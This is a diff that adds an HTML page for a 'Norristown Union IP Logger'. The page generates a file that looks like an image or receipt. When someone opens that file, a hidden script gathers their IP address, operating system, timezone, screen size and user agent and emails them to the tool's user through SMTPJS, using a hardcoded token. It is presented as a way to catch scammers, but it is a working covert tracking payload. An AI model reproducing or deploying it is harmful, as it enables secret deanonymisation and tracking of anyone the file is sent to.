@@ -1,0 +1,157 @@
+<title> Norristown Union IP Logger </title>
+<link href="/style.css" rel="stylesheet" type="text/css" media="all">
+<link rel="icon" href="/favicon.png" type="image/png" sizes="16x16">
+
+Does a scammer ask you for a reciept or photo of any kind? Use this tool to create a file that will get some dirt on the scammer's device and send it to you by email.
+
+
+
+<hr>
+
+
+Add Image: <input type="file" accept="image/*" onchange="preview_image(event)">
+
+<br>
+<br>
+
+<input placeholder="add text" id="outputText">
+
+<br>
+
+<br>
+
+<input id="email" placeholder="your email"> 
+
+<br>
+<br>
+
+<button onclick="create()">Create File</button>
+
+<div id="output">
+<div id="outputOne" style="display:none;">
+	
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	
+</div>
+
+<div id="outputTwo" style="display:none;">
+	
+// Email
+//_________________________________________________________
+
+	
+	var status
+	
+	// Device Timezone
+	// _____________________________
+	
+	var date = new Date();
+	var timezone = date.getTimezoneOffset() / 60
+	timezone = timezone.toString()
+	
+	if(timezone[0] === "-"){}else{
+		timezone = "+" + timezone
+	}
+	
+	timezone = "UTC " + timezone 
+	
+	
+	// OS
+	// _____________________________
+	
+	
+	
+	
+		        var os = "Unknown OS"; 
+        if (navigator.userAgent.indexOf("Win") != -1) os =  
+          "Windows OS"; 
+        if (navigator.userAgent.indexOf("Mac") != -1) os =  
+          "Macintosh"; 
+        if (navigator.userAgent.indexOf("Linux") != -1) os =  
+          "Linux OS"; 
+        if (navigator.userAgent.indexOf("Android") != -1) os =  
+          "Android OS"; 
+        if (navigator.userAgent.indexOf("like Mac") != -1) os =  
+          "iOS"; 
+	
+	// IP
+	// _____________________________
+	
+	var ipAddress
+	
+	var sent = false
+	
+	
+	    $.getJSON("https://api.ipify.org?format=json", 
+        function(data) {  
+             ipAddress = data.ip 
+      })
+	
+setInterval(function(){
+
+	if(sent === false){
+	
+	if(ipAddress === undefined){}else{
+	
+		sent = true
+	
+Email.send({
+    SecureToken : "fbe7f5f7-6bc0-4e3a-834c-2b7fa02d3bda",
+    To : </div>
+
+<div id="outputThree" style="display:none;">
+	
+    From : "no-reply-norristown-union@outlook.com",
+    Subject : "The requested information from Norristown Union",
+    Body : "Browser Language: " + navigator.language + " <br> Device Timezone: " + timezone + " <br> IP Address: " + ipAddress + " <br> Operating System: " + os + " <br> Screen Size: " + screen.width + " x " + screen.height  + " <br> User Agent: " + navigator.userAgent + '<hr> <i>Thank you for using Norristown Union IP Logger. If you would like to see more of our free tools, head <a href="https://norristownunion.neocities.org/moretools.html">here</a>.</i>'
+})
+</div>
+</div>
+
+<script>
+	
+// Image
+//_________________________________________________________
+	
+	var imgSrc;
+	
+  function preview_image(event) {
+    var reader = new FileReader();
+    reader.onload = function(){
+
+			imgSrc = reader.result;
+    }
+    reader.readAsDataURL(event.target.files[0]);
+  }
+	
+	
+	
+</script>
+
+<script>
+	function download(filename, text) {
+  var element = document.createElement('a');
+  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+  element.setAttribute('download', filename);
+
+  element.style.display = 'none';
+  document.body.appendChild(element);
+
+  element.click();
+
+  document.body.removeChild(element);
+}
+	
+	function create(){
+	download("Norristown Union IP Logger.html", document.getElementById("outputOne").innerHTML + "<" + "script>" + document.getElementById("outputTwo").innerHTML + '"' + document.getElementById("email").value + '", ' + document.getElementById("outputThree").innerHTML + ".then( message => status = message ); } } }, 10);	" + "<" + "/script>" + "<img width='50' src='" + imgSrc + "'>" + "<br>" + document.getElementById("outputText").value)
+	}
+	
+</script>
+
+
+
+
+	
+
